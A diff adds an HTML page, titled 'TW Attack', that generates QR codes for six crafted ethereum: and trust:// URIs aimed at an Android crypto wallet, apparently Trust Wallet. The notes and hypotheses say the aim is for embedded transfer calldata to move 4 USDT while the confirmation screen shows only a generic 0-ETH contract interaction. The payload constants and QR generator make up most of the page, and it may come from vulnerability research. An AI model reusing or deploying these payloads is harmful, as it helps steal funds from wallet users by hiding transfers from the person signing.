@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TW Attack — Android Pure Data Focus</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f0f1a; color: #e0e0f0; padding: 20px; max-width: 800px; margin: 0 auto; }
+  h1 { font-size: 22px; margin-bottom: 6px; color: #f0f0ff; }
+  .subtitle { color: #8888bb; font-size: 14px; margin-bottom: 24px; }
+  h2 { font-size: 16px; color: #bbbbff; margin: 20px 0 10px; border-bottom: 1px solid #2a2a3a; padding-bottom: 6px; }
+  .test-card { background: #1a1a2e; border: 1px solid #2a2a3a; border-radius: 12px; padding: 16px; margin-bottom: 16px; }
+  .test-card .label { font-size: 13px; color: #8888bb; font-family: monospace; margin-bottom: 4px; }
+  .test-card .uri { font-size: 11px; color: #aaccff; word-break: break-all; background: #0a0a15; padding: 8px; border-radius: 6px; margin: 6px 0 10px; font-family: monospace; }
+  .qr-container { display: flex; justify-content: center; margin: 8px 0; }
+  .qr-container canvas { border-radius: 8px; }
+  .status { font-size: 12px; margin-top: 8px; padding: 6px 10px; border-radius: 4px; }
+  .status.hypothesis { background: #1a2a1a; color: #88dd88; border-left: 3px solid #44aa44; }
+  .status.note { background: #2a1a1a; color: #dd8888; border-left: 3px solid #aa4444; }
+  .status.control { background: #1a1a2a; color: #8888dd; border-left: 3px solid #4444aa; }
+  button { background: #3a3a5a; color: #e0e0f0; border: 1px solid #4a4a6a; padding: 8px 16px; border-radius: 6px; cursor: pointer; font-size: 13px; margin: 4px; }
+  button:hover { background: #4a4a6a; }
+  .result-input { width: 100%; padding: 8px; border-radius: 6px; border: 1px solid #3a3a5a; background: #0a0a15; color: #e0e0f0; font-size: 13px; margin-top: 6px; }
+  details { margin-top: 20px; }
+  details summary { color: #8888bb; cursor: pointer; font-size: 13px; }
+  .raw { font-size: 11px; color: #666688; font-family: monospace; background: #0a0a15; padding: 8px; border-radius: 4px; margin: 6px 0; white-space: pre-wrap; word-break: break-all; }
+</style>
+</head>
+<body>
+
+<h1>🔬 Android Pure Data Focus</h1>
+<p class="subtitle">Scan with built-in camera (top-right corner) — NOT from Send flow</p>
+
+<div class="status note" style="margin-bottom:20px;">
+<strong>⚡ Key Finding from Test C:</strong> Wallet accepted, gas paid, transaction executed — but USDT didn't transfer. This means either <code>data</code> was stripped or overridden by function-param calldata. These tests remove ALL ambiguity.
+</div>
+
+<!-- Test 1: Pure data, no function, no params -->
+<div class="test-card">
+  <h2>Test 1 — Pure Data, No Function, No Params 🆕</h2>
+  <div class="label">URI</div>
+  <div class="uri" id="uri1">Loading...</div>
+  <div class="qr-container"><div id="qrcode1"></div></div>
+  <div class="status hypothesis">
+    <strong>Hypothesis:</strong> No function = can't build erc20_transfer. Routes to contract_generic with only data. Shows generic "Contract Interaction" with 0 ETH. Data passes through → 4 USDT transfers.
+  </div>
+  <div class="status note">
+    <strong>Android scan:</strong> Built-in camera → should show "Contract Interaction" or "Interact with 0xUSDT" with 0 ETH amount. The question is whether data passes through.
+  </div>
+  <input class="result-input" placeholder="What does the confirmation screen show? Is NEXT enabled? What happens after confirm?" id="result1">
+</div>
+
+<!-- Test 2: EIP-681 /transfer with ONLY data, no address/uint256 -->
+<div class="test-card">
+  <h2>Test 2 — EIP-681 /transfer With Only Data 🆕</h2>
+  <div class="label">URI</div>
+  <div class="uri" id="uri2">Loading...</div>
+  <div class="qr-container"><div id="qrcode2"></div></div>
+  <div class="status hypothesis">
+    <strong>Hypothesis:</strong> Parser sees <code>/transfer</code> but can't build erc20_transfer (no address/uint256 params). Falls through to contract_generic. Data passes through.
+  </div>
+  <div class="status note">
+    <strong>Android scan:</strong> Built-in camera → might show "Interact with 0xUSDT" or might show "No recipient" error. If it shows amount or address, we learn something.
+  </div>
+  <input class="result-input" placeholder="What does the scanner show? Any error or confirmation screen?" id="result2">
+</div>
+
+<!-- Test 3: trust:// send with asset, minimal amount, and data -->
+<div class="test-card">
+  <h2>Test 3 — trust:// + Asset + Tiny Amount + Data 🆕</h2>
+  <div class="label">URI</div>
+  <div class="uri" id="uri3">Loading...</div>
+  <div class="qr-container"><div id="qrcode3"></div></div>
+  <div class="status control">
+    <strong>Control:</strong> With <code>asset</code> and <code>amount</code>, wallet routes to erc20_transfer. Amount=1 (0.000001 USDT) should pass minimum. But erc20_transfer will ignore data. If this shows 0.000001 USDT and executes that, we confirm erc20_transfer always ignores data.
+  </div>
+  <input class="result-input" placeholder="Does it show 0.000001 USDT? Does it execute that amount?" id="result3">
+</div>
+
+<!-- Test 4: ethereum:0xUSDT only, no function, no params, just data -->
+<div class="test-card">
+  <h2>Test 4 — ethereum:0xUSDT with ONLY data, No /transfer, No params 🆕</h2>
+  <div class="label">URI</div>
+  <div class="uri" id="uri4">Loading...</div>
+  <div class="qr-container"><div id="qrcode4"></div></div>
+  <div class="status hypothesis">
+    <strong>Hypothesis:</strong> Pure <code>ethereum:0xCONTRACT@1?data=...</code> — no function, no params. Wallet has no choice but to route to contract_generic with data. Most likely to pass data through.
+  </div>
+  <div class="status note">
+    <strong>Android scan:</strong> Built-in camera → Should show "Contract Interaction" or "Interact with 0xdAC17..." with 0 ETH. If data passes through, 4 USDT transfers.
+  </div>
+  <input class="result-input" placeholder="What shows on screen? Confirm result?" id="result4">
+</div>
+
+<!-- Test 5: ethereum:0xUSDT@1/transfer?data=... with only data (different from Test 2) -->
+<div class="test-card">
+  <h2>Test 5 — trust://send?asset=usdt&address=RCP&data=<4U> (NO amount) 🆕</h2>
+  <div class="label">URI</div>
+  <div class="uri" id="uri5">Loading...</div>
+  <div class="qr-container"><div id="qrcode5"></div></div>
+  <div class="status hypothesis">
+    <strong>Hypothesis:</strong> trust:// with asset and address but NO amount. No amount = no erc20_transfer. Routes to generic. Data passes through. But may hit minimum check (0 USDT shown).
+  </div>
+  <div class="status note">
+    <strong>Android scan:</strong> Built-in camera → should pre-select USDT (asset present). May show 0 USDT amount. Question: does it block at minimum check or allow proceed?
+  </div>
+  <input class="result-input" placeholder="Does it auto-select USDT? Shows 0? Can you proceed?" id="result5">
+</div>
+
+<!-- Test 6: trust:// send with asset, tiny amount, and data - but built-in camera path -->
+<div class="test-card">
+  <h2>Test 6 — trust://send?asset=usdt&address=RCP&amount=1&data=<4U> (REPEAT via camera) 🆕</h2>
+  <div class="label">URI</div>
+  <div class="uri" id="uri6">Loading...</div>
+  <div class="qr-container"><div id="qrcode6"></div></div>
+  <div class="status control">
+    <strong>Control:</strong> Same as earlier tests with amount=1 but scanned via built-in camera. Confirms camera path doesn't change erc20_transfer routing.
+  </div>
+  <input class="result-input" placeholder="Shows 1 USDT? Confirms same behavior?" id="result6">
+</div>
+
+<details>
+  <summary>🔧 Raw URIs (for manual testing)</summary>
+  <div class="raw" id="raw-uris"></div>
+</details>
+
+<script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+<script>
+const USDT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+const RECIPIENT = '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266';
+const TEST_AMOUNT = '1000000'; // 1 USDT
+const ATTACK_AMOUNT = '4000000'; // 4 USDT
+
+// ABI-encoded transfer(0xf39F..., 4000000) with 6 decimals
+// 0xa9059cbb + padded recipient + padded 4000000
+const ABICALL = '0xa9059cbb' +
+  '000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb92266' +
+  '00000000000000000000000000000000000000000000000000000000003d0900';
+
+const tests = [
+  {
+    id: 1,
+    label: '1 — Pure EIP-681 no function, ONLY data',
+    uri: `ethereum:${USDT}@1?data=${ABICALL}`
+  },
+  {
+    id: 2,
+    label: '2 — EIP-681 /transfer with ONLY data',
+    uri: `ethereum:${USDT}@1/transfer?data=${ABICALL}`
+  },
+  {
+    id: 3,
+    label: '3 — trust:// + asset + tiny amount + data',
+    uri: `trust://send?asset=${USDT}&address=${RECIPIENT}&amount=1&data=${ABICALL}`
+  },
+  {
+    id: 4,
+    label: '4 — ethereum: only chain, contract, data (no fn)',
+    uri: `ethereum:${USDT}@1?data=${ABICALL}`
+  },
+  {
+    id: 5,
+    label: '5 — trust:// + asset + address + data (NO amount)',
+    uri: `trust://send?asset=${USDT}&address=${RECIPIENT}&data=${ABICALL}`
+  },
+  {
+    id: 6,
+    label: '6 — trust:// + asset + amount=1 + data (control via camera)',
+    uri: `trust://send?asset=${USDT}&address=${RECIPIENT}&amount=1&data=${ABICALL}`
+  }
+];
+
+function generateQR(containerId, uri, uriId) {
+  document.getElementById(uriId).textContent = uri;
+  const container = document.getElementById(containerId);
+  container.innerHTML = '';
+  try {
+    new QRCode(container, {
+      text: uri,
+      width: 200,
+      height: 200,
+      colorDark: '#ffffff',
+      colorLight: '#1a1a2e',
+      correctLevel: QRCode.CorrectLevel.H
+    });
+  } catch(e) {
+    container.innerHTML = '<span style="color:#ff6666;font-size:12px;">QR generation error</span>';
+  }
+}
+
+tests.forEach(t => {
+  generateQR(`qrcode${t.id}`, t.uri, `uri${t.id}`);
+});
+
+document.getElementById('raw-uris').textContent = tests.map(t =>
+  `${t.label}\n${t.uri}\n`
+).join('\n');
+</script>
+</body>
+</html>
